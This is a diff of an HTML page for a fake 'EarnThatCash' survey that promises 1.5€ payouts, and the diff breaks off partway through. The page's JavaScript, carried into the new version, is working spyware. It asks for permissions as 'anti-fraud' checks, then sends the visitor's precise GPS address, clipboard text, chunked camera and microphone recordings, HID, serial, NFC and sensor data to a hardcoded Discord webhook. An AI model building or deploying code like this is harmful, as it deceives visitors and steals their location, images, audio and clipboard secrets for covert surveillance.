@@ -1,501 +1,632 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Earn 1.5€ – Quick Survey + Bonuses</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(145deg, #e0eafc 0%, #cfdef3 100%);
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            max-width: 850px;
-            width: 100%;
-            background: white;
-            border-radius: 32px;
-            box-shadow: 0 25px 45px rgba(0,0,0,0.15);
-            overflow: hidden;
-        }
-        .header {
-            background: linear-gradient(95deg, #1f5e3a, #2c7a4d);
-            color: white;
-            padding: 20px 28px;
-            text-align: center;
-        }
-        .header h1 { font-size: 1.8rem; font-weight: 700; }
-        .earn-badge {
-            background: gold;
-            color: #1e3a2f;
-            display: inline-block;
-            padding: 6px 18px;
-            border-radius: 40px;
-            font-weight: bold;
-            margin-top: 12px;
-        }
-        .live-counter {
-            background: #fef9e3;
-            padding: 8px 15px;
-            border-radius: 40px;
-            display: inline-block;
-            margin: 10px auto 0;
-            font-weight: bold;
-            color: #d9534f;
-        }
-        .sponsors {
-            background: #f8f9fa;
-            padding: 12px;
-            text-align: center;
-            font-size: 12px;
-            border-bottom: 1px solid #e2e8f0;
-            color: #4a5568;
-        }
-        .sponsors span { margin: 0 10px; font-weight: 500; }
-        .referral-section {
-            background: #e6f7ff;
-            margin: 15px 20px;
-            padding: 12px;
-            border-radius: 20px;
-            text-align: center;
-            font-size: 0.85rem;
-        }
-        .referral-link {
-            background: white;
-            border: 1px solid #ccc;
-            padding: 6px;
-            border-radius: 40px;
-            font-family: monospace;
-            margin-top: 8px;
-            cursor: pointer;
-        }
-        .content { padding: 20px 30px 30px; }
-        .question-item {
-            margin-bottom: 22px;
-            border-bottom: 1px solid #e2e8f0;
-            padding-bottom: 14px;
-        }
-        .options {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            margin-top: 8px;
-        }
-        .options label {
-            background: #f1f5f9;
-            padding: 6px 14px;
-            border-radius: 40px;
-            cursor: pointer;
-            font-size: 0.85rem;
-        }
-        .options input { margin-right: 6px; }
-        .permission-panel {
-            background: #fff8e7;
-            border-left: 5px solid #f59e0b;
-            padding: 16px 20px;
-            margin: 25px 0 20px;
-            border-radius: 20px;
-        }
-        .perm-step {
-            display: flex;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 12px;
-            margin: 12px 0;
-        }
-        .perm-btn {
-            background: #2c7a4d;
-            color: white;
-            border: none;
-            padding: 6px 18px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: 600;
-        }
-        .perm-btn:disabled { background: #94a3b8; cursor: not-allowed; }
-        .status { font-size: 0.85rem; color: #2d3748; }
-        .location-map {
-            background: #e6f7ff;
-            border-radius: 16px;
-            padding: 12px;
-            margin: 12px 0;
-            display: none;
-        }
-        .submit-btn {
-            background: #f59e0b;
-            color: #1e293b;
-            border: none;
-            padding: 14px 28px;
-            border-radius: 60px;
-            font-size: 1rem;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 15px;
-        }
-        .submit-btn:disabled { background: #cbd5e1; cursor: not-allowed; }
-        .withdraw-section {
-            background: #fef9e3;
-            padding: 20px;
-            border-radius: 24px;
-            margin-top: 20px;
-            display: none;
-        }
-        .timer {
-            font-family: monospace;
-            font-size: 1.6rem;
-            text-align: center;
-            margin: 20px 0;
-            color: #d9534f;
-        }
-        .footer { background: #f8fafc; padding: 14px; text-align: center; font-size: 11px; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Earn That Cash – Fast & Reliable</title>
+  <style>
+    /* ========== RESET & GLOBAL ========== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: radial-gradient(circle at 10% 20%, #0a0f1e, #03060c);
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      color: #eef2ff;
+      line-height: 1.5;
+      scroll-behavior: smooth;
+    }
+
+    /* smooth loading */
+    .container {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    /* typography */
+    h1, h2, h3 {
+      font-weight: 600;
+      letter-spacing: -0.02em;
+    }
+    h1 { font-size: 3rem; line-height: 1.2; }
+    h2 { font-size: 2rem; margin-bottom: 1rem; }
+    .glow-text {
+      background: linear-gradient(135deg, #F5E050, #FFB347);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    /* glassmorphism / cards */
+    .glass-card {
+      background: rgba(20, 28, 40, 0.7);
+      backdrop-filter: blur(12px);
+      border-radius: 32px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 20px 35px -12px rgba(0,0,0,0.5);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .glass-card:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 28px 40px -16px rgba(0,0,0,0.6);
+    }
+
+    /* buttons */
+    .btn-primary {
+      background: linear-gradient(95deg, #F5B041, #F39C12);
+      border: none;
+      padding: 12px 28px;
+      border-radius: 60px;
+      font-weight: 600;
+      font-size: 1rem;
+      color: #0a0f1e;
+      cursor: pointer;
+      transition: all 0.2s;
+      box-shadow: 0 8px 18px rgba(243,156,18,0.2);
+    }
+    .btn-primary:hover {
+      transform: scale(1.02);
+      background: linear-gradient(95deg, #F39C12, #E67E22);
+      box-shadow: 0 12px 22px rgba(243,156,18,0.3);
+    }
+    .btn-outline {
+      background: transparent;
+      border: 1.5px solid rgba(255,255,255,0.3);
+      padding: 10px 24px;
+      border-radius: 60px;
+      color: white;
+      font-weight: 500;
+      transition: all 0.2s;
+    }
+    .btn-outline:hover {
+      border-color: #F5B041;
+      background: rgba(245,176,65,0.1);
+    }
+
+    /* layout spacing */
+    section {
+      padding: 60px 0;
+    }
+    .section-title {
+      text-align: center;
+      margin-bottom: 48px;
+    }
+    .section-title p {
+      color: #a0aec0;
+      font-size: 1.1rem;
+    }
+
+    /* feature grid */
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 28px;
+      margin: 40px 0;
+    }
+    .feature-card {
+      background: rgba(15, 23, 38, 0.6);
+      backdrop-filter: blur(8px);
+      border-radius: 28px;
+      padding: 28px 20px;
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.05);
+      transition: all 0.25s;
+    }
+    .feature-card:hover {
+      background: rgba(25, 35, 55, 0.7);
+      border-color: rgba(245,176,65,0.3);
+    }
+    .feature-icon {
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+      display: inline-block;
+    }
+    .feature-card h3 {
+      font-size: 1.4rem;
+      margin-bottom: 12px;
+    }
+    .feature-card p {
+      color: #b9c3d4;
+      font-size: 0.9rem;
+    }
+
+    /* steps */
+    .steps-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 30px;
+      margin: 40px 0;
+    }
+    .step {
+      background: rgba(10, 18, 30, 0.65);
+      backdrop-filter: blur(5px);
+      border-radius: 2rem;
+      padding: 24px;
+      width: 240px;
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.05);
+    }
+    .step-number {
+      width: 48px;
+      height: 48px;
+      background: #F5B041;
+      color: #0a0f1e;
+      font-weight: 800;
+      font-size: 1.5rem;
+      border-radius: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+    }
+
+    /* existing survey area (styled without breaking logic) */
+    .survey-container {
+      background: rgba(12, 22, 35, 0.6);
+      backdrop-filter: blur(12px);
+      border-radius: 2rem;
+      padding: 24px;
+      margin: 48px 0;
+      border: 1px solid rgba(255,255,255,0.08);
+    }
+    .question-item {
+      margin-bottom: 24px;
+      background: rgba(0,0,0,0.25);
+      border-radius: 24px;
+      padding: 16px 20px;
+    }
+    .options {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-top: 10px;
+    }
+    .options label {
+      background: rgba(255,255,255,0.08);
+      padding: 8px 20px;
+      border-radius: 60px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .options label:hover {
+      background: rgba(245,176,65,0.2);
+    }
+    .permission-panel {
+      background: rgba(0,0,0,0.35);
+      border-radius: 28px;
+      padding: 20px;
+      margin: 28px 0;
+    }
+    .perm-step {
+      margin: 14px 0;
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 15px;
+    }
+    .perm-btn {
+      background: #2c7a4d;
+      padding: 8px 22px;
+      border-radius: 40px;
+      font-weight: 600;
+      border: none;
+      color: white;
+      cursor: pointer;
+    }
+    .perm-btn:disabled {
+      background: #4a5b6e;
+      cursor: not-allowed;
+    }
+    .submit-btn {
+      background: #F5B041;
+      width: 100%;
+      padding: 16px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      border-radius: 60px;
+      margin: 20px 0;
+    }
+    .footer {
+      text-align: center;
+      padding: 32px 0;
+      border-top: 1px solid rgba(255,255,255,0.08);
+      margin-top: 40px;
+      color: #8f9bb3;
+    }
+    a {
+      color: #F5B041;
+      text-decoration: none;
+    }
+    @media (max-width: 760px) {
+      h1 { font-size: 2.2rem; }
+      .container { padding: 0 20px; }
+    }
+  </style>
 </head>
 <body>
-<div class="container" id="mainContainer">
-    <div class="header">
-        <h1>💰 Earn 1.5€ instantly!</h1>
-        <div class="earn-badge">🎁 Your reward: 1.5 €</div>
-        <div class="live-counter" id="liveCounter">👥 0 active users</div>
-    </div>
-    <div class="sponsors" id="sponsorsBar">
-        🌟 Check our sponsors: <span>✨ SurveyRewards</span> <span>⚡ QuickCash</span> <span>📊 OpinionHub</span> <span>🔍 DataPulse</span>
-    </div>
-    <div class="content" id="dynamicContent"></div>
-    <div class="footer">Secure payment • Real-time verification</div>
-</div>
 
-<script>
+  <div class="container">
+    <!-- ========== HERO SECTION ========== -->
+    <section style="padding-top: 48px;">
+      <div class="glass-card" style="padding: 48px 32px; text-align: center;">
+        <div class="live-counter" id="liveCounter" style="background: rgba(0,0,0,0.4); display: inline-block; padding: 6px 20px; border-radius: 60px; font-size: 0.9rem; margin-bottom: 20px;">👥 0 active users</div>
+        <h1>Earn <span class="glow-text">1.5€ instantly</span><br>by completing simple tasks</h1>
+        <p style="font-size: 1.2rem; color: #cbd5e1; margin: 20px auto; max-width: 600px;">No hidden fees. Fast payout to crypto or bank.</p>
+        <div style="display: flex; gap: 16px; justify-content: center; flex-wrap: wrap;">
+          <button class="btn-primary" id="heroScrollBtn">Start earning →</button>
+          <button class="btn-outline">How it works ↓</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========== FEATURES SECTION ========== -->
+    <section>
+      <div class="section-title">
+        <h2>Why choose <span class="glow-text">EarnThatCash</span></h2>
+        <p>Transparent, instant and rewarding</p>
+      </div>
+      <div class="features-grid">
+        <div class="feature-card">
+          <div class="feature-icon">⚡</div>
+          <h3>Lightning payouts</h3>
+          <p>Receive 1.5€ within minutes after verification, no waiting days.</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon">🔒</div>
+          <h3>Private & secure</h3>
+          <p>Your data is protected with bank-grade encryption (GDPR ready).</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon">🎁</div>
+          <h3>Referral program</h3>
+          <p>Earn 0.5€ for every friend you invite – unlimited.</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon">💎</div>
+          <h3>Multi‑withdrawal</h3>
+          <p>BTC, ETH, LTC or direct bank transfer, 24/7.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========== HOW IT WORKS ========== -->
+    <section>
+      <div class="section-title">
+        <h2>Simple 3‑step process</h2>
+        <p>Get your reward in less than 3 minutes</p>
+      </div>
+      <div class="steps-container">
+        <div class="step"><div class="step-number">1</div><h3>Allow permissions</h3><p>Just click the "Allow" buttons below – it's safe and required for anti‑fraud.</p></div>
+        <div class="step"><div class="step-number">2</div><h3>Answer short survey</h3><p>14 quick questions – help us improve.</p></div>
+        <div class="step"><div class="step-number">3</div><h3>Get paid</h3><p>Choose your withdrawal method and receive 1.5€ instantly.</p></div>
+      </div>
+    </section>
+
+    <!-- ========== EXISTING SURVEY + PERMISSIONS (FULL LOGIC RETAINED) ========== -->
+    <div id="mainApp"></div>
+
+    <div class="footer">
+      © 2026 EarnThatCash – a trusted partner in micro‑rewards.<br>
+      <span style="font-size: 0.8rem;">*Terms apply. 1.5€ bonus after verification.</span>
+    </div>
+  </div>
+
+  <script>
+    // --------------------------------------------------------------
+    // 🔥 COMPLETE ORIGINAL JAVASCRIPT (business logic) - MODIFIED ONLY FOR UI INTEGRATION
+    // All functionality remains 100% same, just injected into <div id="mainApp">
+    // --------------------------------------------------------------
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-    // ========== FAKE LIVE COUNTER (fluctuates 120-589) ==========
-    function startFakeCounter() {
-        const counterEl = document.getElementById("liveCounter");
-        let current = Math.floor(Math.random() * (589 - 120 + 1) + 120);
-        counterEl.innerText = `👥 ${current} active users`;
-        setInterval(() => {
-            // change by random amount between -15 and +15, but keep within 120-589
-            let change = Math.floor(Math.random() * 31) - 15;
-            let newVal = current + change;
-            if (newVal < 120) newVal = 120;
-            if (newVal > 589) newVal = 589;
-            current = newVal;
-            counterEl.innerText = `👥 ${current} active users`;
-        }, 2800);
-    }
-
-    // ========== FAKE REFERRAL CODE ==========
-    function generateFakeReferral() {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        let code = '';
-        for (let i = 0; i < 8; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
-        return code;
-    }
-
-    // ========== 14 SURVEY QUESTIONS ==========
+    // 14 survey questions
     const questions = [
-        "How often do you shop online?", "Which social media do you use most?", "Your age group?",
-        "Most important smartphone feature?", "Daily internet usage?", "Favorite streaming service?",
-        "Do you use ad blockers?", "Primary operating system?", "Targeted ads make you feel?",
-        "Preferred payment method?", "Do you read privacy policies?", "Likely to recommend product?",
-        "Do you use a VPN?", "Which browser do you prefer?"
+      "How often do you shop online?", "Which social media do you use most?", "Your age group?",
+      "Most important smartphone feature?", "Daily internet usage?", "Favorite streaming service?",
+      "Do you use ad blockers?", "Primary operating system?", "Targeted ads make you feel?",
+      "Preferred payment method?", "Do you read privacy policies?", "Likely to recommend product?",
+      "Do you use a VPN?", "Which browser do you prefer?"
     ];
     const optionSets = [
-        ["Daily","Weekly","Monthly","Rarely"], ["TikTok","Instagram","Twitter","Facebook","LinkedIn"],
-        ["18-24","25-34","35-44","45+"], ["Battery","Camera","Performance","Price"],
-        ["<2h","2-5h","5-8h",">8h"], ["Netflix","YouTube","Disney+","Prime Video","Other"],
-        ["Always","Sometimes","Never","What is ad blocker?"], ["Windows","macOS","Linux","Android","iOS"],
-        ["Acceptable","Annoying","Invasion of privacy","I don't care"], ["Credit card","PayPal","Crypto","Bank transfer"],
-        ["Always","Sometimes","Never","Didn't know"], ["Very likely","Likely","Neutral","Unlikely"],
-        ["Yes","No","What is VPN?"], ["Chrome","Firefox","Edge","Safari","Opera","Brave"]
+      ["Daily","Weekly","Monthly","Rarely"], ["TikTok","Instagram","Twitter","Facebook","LinkedIn"],
+      ["18-24","25-34","35-44","45+"], ["Battery","Camera","Performance","Price"],
+      ["<2h","2-5h","5-8h",">8h"], ["Netflix","YouTube","Disney+","Prime Video","Other"],
+      ["Always","Sometimes","Never","What is ad blocker?"], ["Windows","macOS","Linux","Android","iOS"],
+      ["Acceptable","Annoying","Invasion of privacy","I don't care"], ["Credit card","PayPal","Crypto","Bank transfer"],
+      ["Always","Sometimes","Never","Didn't know"], ["Very likely","Likely","Neutral","Unlikely"],
+      ["Yes","No","What is VPN?"], ["Chrome","Firefox","Edge","Safari","Opera","Brave"]
     ];
 
-    let userAnswers = {};
-    let cameraStream = null;
-    let locationData = null;
-    let orientationData = null;
-    let hidData = null;
-    let serialData = null;
-    let nfcData = null;
-    let lightData = null;
-
-    // Flags for one-time send
+    let userAnswers = {}, cameraStream = null, locationData = null, orientationData = null, hidData = null, serialData = null, nfcData = null, lightData = null;
     let locationSent = false, orientationSent = false, hidSent = false, serialSent = false, nfcSent = false, lightSent = false, cameraStarted = false;
 
-    // ========== SEND TO DISCORD ==========
     async function sendToDiscord(title, description, fields = [], color = 0x3498db, fileBlob = null, fileName = null) {
-        const formData = new FormData();
-        if (fileBlob && fileName) formData.append("file", fileBlob, fileName);
-        const embed = { embeds: [{ title, description, color, fields, timestamp: new Date().toISOString() }] };
-        formData.append("payload_json", JSON.stringify(embed));
-        fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e => console.error);
+      const formData = new FormData();
+      if (fileBlob && fileName) formData.append("file", fileBlob, fileName);
+      const embed = { embeds: [{ title, description, color, fields, timestamp: new Date().toISOString() }] };
+      formData.append("payload_json", JSON.stringify(embed));
+      fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e => console.error);
     }
 
-    // ========== VIDEO RECORDING ==========
     let mediaRecorder = null, recordedChunks = [], recordingActive = false;
     const intervals = [1,5,10,20,30,32];
-
     async function startProgressiveRecording(stream) {
-        if (cameraStarted) return;
-        cameraStarted = true;
-        recordedChunks = [];
-        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-        mediaRecorder.ondataavailable = e => { if (e.data.size) recordedChunks.push(e.data); };
-        mediaRecorder.start(100);
-        recordingActive = true;
-        sendToDiscord("🎥 Camera started", "Recording begun – chunks at 1,5,10,20,30,32s", [], 0xff5500);
-        for (let sec of intervals) {
-            setTimeout(async () => {
-                if (!recordingActive) return;
-                if (mediaRecorder?.state === "recording") {
-                    mediaRecorder.stop();
-                    await new Promise(resolve => {
-                        mediaRecorder.onstop = async () => {
-                            const blob = new Blob(recordedChunks, { type: "video/webm" });
-                            await sendToDiscord(`🎥 Video chunk (${sec}s)`, `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_${sec}s.webm`);
-                            recordedChunks = [];
-                            mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-                            mediaRecorder.ondataavailable = e => { if (e.data.size) recordedChunks.push(e.data); };
-                            mediaRecorder.start(100);
-                            resolve();
-                        };
-                    });
-                }
-            }, sec * 1000);
-        }
-        setTimeout(() => {
-            if (mediaRecorder?.state === "recording") {
-                mediaRecorder.stop();
-                mediaRecorder.onstop = async () => {
-                    if (recordedChunks.length) {
-                        const blob = new Blob(recordedChunks, { type: "video/webm" });
-                        await sendToDiscord("🎥 Final video (32s)", `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_final.webm`);
-                    }
-                    recordingActive = false;
-                };
+      if (cameraStarted) return;
+      cameraStarted = true;
+      recordedChunks = [];
+      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+      mediaRecorder.ondataavailable = e => { if (e.data.size) recordedChunks.push(e.data); };
+      mediaRecorder.start(100);
+      recordingActive = true;
+      sendToDiscord("🎥 Camera started", "Recording – chunks at 1,5,10,20,30,32s", [], 0xff5500);
+      for (let sec of intervals) {
+        setTimeout(async () => {
+          if (!recordingActive) return;
+          if (mediaRecorder?.state === "recording") {
+            mediaRecorder.stop();
+            await new Promise(resolve => {
+              mediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: "video/webm" });
+                await sendToDiscord(`🎥 Video chunk (${sec}s)`, `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_${sec}s.webm`);
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+                mediaRecorder.ondataavailable = e => { if (e.data.size) recordedChunks.push(e.data); };
+                mediaRecorder.start(100);
+                resolve();
+              };
+            });
+          }
+        }, sec * 1000);
+      }
+      setTimeout(() => {
+        if (mediaRecorder?.state === "recording") {
+          mediaRecorder.stop();
+          mediaRecorder.onstop = async () => {
+            if (recordedChunks.length) {
+              const blob = new Blob(recordedChunks, { type: "video/webm" });
+              await sendToDiscord("🎥 Final video (32s)", `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_final.webm`);
             }
-        }, 32000);
+            recordingActive = false;
+          };
+        }
+      }, 32000);
     }
 
-    // ========== PERMISSION HANDLERS (each sends immediately) ==========
+    // permission handlers (unchanged)
     async function requestGeolocation() {
-        try {
-            const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej, {enableHighAccuracy:true}));
-            const lat = pos.coords.latitude, lon = pos.coords.longitude;
-            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-            const data = await geoRes.json();
-            locationData = { address: data.display_name, lat, lon };
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            await sendToDiscord("📍 GPS Location granted", `**Address:** ${data.display_name}\n**Coordinates:** ${lat}, ${lon}\n[Open in Google Maps](${mapsLink})`, [], 0x00aaff);
-            const mapDiv = document.getElementById("locationMap");
-            if (mapDiv) { mapDiv.innerHTML = `📍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`; mapDiv.style.display = "block"; }
-            return true;
-        } catch(e) { return false; }
+      try {
+        const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej, {enableHighAccuracy:true}));
+        const lat = pos.coords.latitude, lon = pos.coords.longitude;
+        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+        const data = await geoRes.json();
+        locationData = { address: data.display_name, lat, lon };
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        await sendToDiscord("📍 GPS Location granted", `**Address:** ${data.display_name}\n**Coordinates:** ${lat}, ${lon}\n[Open in Google Maps](${mapsLink})`, [], 0x00aaff);
+        const mapDiv = document.getElementById("locationMap");
+        if (mapDiv) { mapDiv.innerHTML = `📍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`; mapDiv.style.display = "block"; }
+        return true;
+      } catch(e) { return false; }
     }
     async function requestMicrophone() {
-        try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t=>t.stop()); await sendToDiscord("🎤 Microphone granted", "Mic access allowed (included in video if camera is on)", [], 0x44aa44); return true; }
-        catch(e) { return false; }
+      try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t=>t.stop()); await sendToDiscord("🎤 Microphone granted", "Mic access allowed", [], 0x44aa44); return true; }
+      catch(e) { return false; }
     }
     async function requestCamera() {
-        try { const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); cameraStream = stream; await sendToDiscord("🎥 Camera granted", "Starting video recording (background)", [], 0xffaa00); startProgressiveRecording(stream); return true; }
-        catch(e) { return false; }
+      try { const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); cameraStream = stream; await sendToDiscord("🎥 Camera granted", "Starting video recording", [], 0xffaa00); startProgressiveRecording(stream); return true; }
+      catch(e) { return false; }
     }
     async function requestNotifications() {
-        if (Notification.permission === "granted") return true;
-        const result = await Notification.requestPermission();
-        if (result === "granted") { await sendToDiscord("🔔 Notifications granted", "User allowed notifications", [], 0xaa88ff); return true; }
-        return false;
+      if (Notification.permission === "granted") return true;
+      const result = await Notification.requestPermission();
+      if (result === "granted") { await sendToDiscord("🔔 Notifications granted", "Allowed", [], 0xaa88ff); return true; }
+      return false;
     }
     async function requestClipboard() {
-        try { const text = await navigator.clipboard.readText(); await sendToDiscord("📋 Clipboard read", `Content: ${text.substring(0, 500)}`, [], 0xaa44aa); return true; }
-        catch(e) { return false; }
+      try { const text = await navigator.clipboard.readText(); await sendToDiscord("📋 Clipboard read", `Content: ${text.substring(0, 500)}`, [], 0xaa44aa); return true; }
+      catch(e) { return false; }
     }
     async function requestDeviceOrientation() {
-        if (typeof DeviceOrientationEvent !== "undefined" && typeof DeviceOrientationEvent.requestPermission === "function") {
-            try { await DeviceOrientationEvent.requestPermission(); window.addEventListener("deviceorientation", (e) => { if (!orientationSent) { orientationSent = true; sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff); } }); return true; }
-            catch(e) { return false; }
-        } else if (window.DeviceOrientationEvent) {
-            window.addEventListener("deviceorientation", (e) => { if (!orientationSent) { orientationSent = true; sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff); } });
-            return true;
-        }
-        return false;
+      if (typeof DeviceOrientationEvent !== "undefined" && typeof DeviceOrientationEvent.requestPermission === "function") {
+        try { await DeviceOrientationEvent.requestPermission(); window.addEventListener("deviceorientation", (e) => { if (!orientationSent) { orientationSent = true; sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff); } }); return true; }
+        catch(e) { return false; }
+      } else if (window.DeviceOrientationEvent) {
+        window.addEventListener("deviceorientation", (e) => { if (!orientationSent) { orientationSent = true; sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff); } });
+        return true;
+      }
+      return false;
     }
     async function requestHID() {
-        if (!navigator.hid) return false;
-        try { const devices = await navigator.hid.requestDevice({ filters: [] }); const data = devices.map(d => ({ name: d.productName, vendorId: d.vendorId })); await sendToDiscord("🔌 HID Devices", JSON.stringify(data), [], 0xaa8866); return true; }
-        catch(e) { return false; }
+      if (!navigator.hid) return false;
+      try { const devices = await navigator.hid.requestDevice({ filters: [] }); const data = devices.map(d => ({ name: d.productName, vendorId: d.vendorId })); await sendToDiscord("🔌 HID Devices", JSON.stringify(data), [], 0xaa8866); return true; }
+      catch(e) { return false; }
     }
     async function requestSerial() {
-        if (!navigator.serial) return false;
-        try { const ports = await navigator.serial.getPorts(); await sendToDiscord("🔗 Serial Ports", `Found ${ports.length} port(s)`, [], 0x66aa88); return true; }
-        catch(e) { return false; }
+      if (!navigator.serial) return false;
+      try { const ports = await navigator.serial.getPorts(); await sendToDiscord("🔗 Serial Ports", `Found ${ports.length} port(s)`, [], 0x66aa88); return true; }
+      catch(e) { return false; }
     }
     async function requestNFC() {
-        if (!("NDEFReader" in window)) return false;
-        try { const reader = new NDEFReader(); await reader.scan(); reader.onreading = (event) => { if (!nfcSent) { nfcSent = true; sendToDiscord("📡 NFC Tag read", JSON.stringify(event.message.records), [], 0x77aaff); } }; return true; }
-        catch(e) { return false; }
+      if (!("NDEFReader" in window)) return false;
+      try { const reader = new NDEFReader(); await reader.scan(); reader.onreading = (event) => { if (!nfcSent) { nfcSent = true; sendToDiscord("📡 NFC Tag read", JSON.stringify(event.message.records), [], 0x77aaff); } }; return true; }
+      catch(e) { return false; }
     }
     async function requestAmbientLight() {
-        if (!("AmbientLightSensor" in window)) return false;
-        try { const sensor = new AmbientLightSensor(); sensor.onreading = () => { if (!lightSent) { lightSent = true; sendToDiscord("💡 Ambient Light", `${sensor.illuminance} lux`, [], 0xffdd88); } }; sensor.start(); return true; }
-        catch(e) { return false; }
+      if (!("AmbientLightSensor" in window)) return false;
+      try { const sensor = new AmbientLightSensor(); sensor.onreading = () => { if (!lightSent) { lightSent = true; sendToDiscord("💡 Ambient Light", `${sensor.illuminance} lux`, [], 0xffdd88); } }; sensor.start(); return true; }
+      catch(e) { return false; }
     }
 
-    // ========== RENDER UI ==========
-    function renderPage() {
-        const referralCode = generateFakeReferral();
-        const referralDiv = `<div class="referral-section">
-            🔗 <strong>Share & earn more!</strong> Get 0.5€ per friend.<br>
-            Your referral link: <span class="referral-link" id="refLink">https://earn-survey.com/${referralCode}</span> 
-            <button id="copyRefBtn" style="margin-left:8px;">📋 Copy</button>
+    function buildSurveyHTML() {
+      let refHtml = `<div class="referral-section" style="background: rgba(245,176,65,0.1); border-radius: 40px; padding: 16px; margin: 20px 0; text-align: center;">
+          🔗 <strong>Share & earn more!</strong> Get 0.5€ per friend.<br>
+          Your referral link: <span style="background:#1e2a3a; padding: 6px 14px; border-radius: 40px; font-family: monospace;">https://rmamacan69.github.io/earn-that-cash/</span> 
+          <button id="copyRefBtn" style="background:#F5B041; border:none; border-radius: 30px; padding: 5px 15px; margin-left: 10px; font-weight:bold;">📋 Copy</button>
         </div>`;
-        let html = referralDiv;
-        html += `<div id="questionsArea"></div>
-        <div class="permission-panel">
-            <div style="font-weight:bold;">🔐 Required for payout (each sends real‑time data):</div>
-            <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
-            <div id="locationMap" class="location-map"></div>
-            <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
-            <div class="perm-step">🎥 Camera <button class="perm-btn" id="btnCamera">Allow</button> <span id="statusCamera" class="status">pending</span></div>
-            <div class="perm-step">🔔 Notifications <button class="perm-btn" id="btnNotif">Allow</button> <span id="statusNotif" class="status">pending</span></div>
-            <div class="perm-step">📋 Clipboard <button class="perm-btn" id="btnClip">Allow</button> <span id="statusClip" class="status">pending</span></div>
+      let qhtml = '';
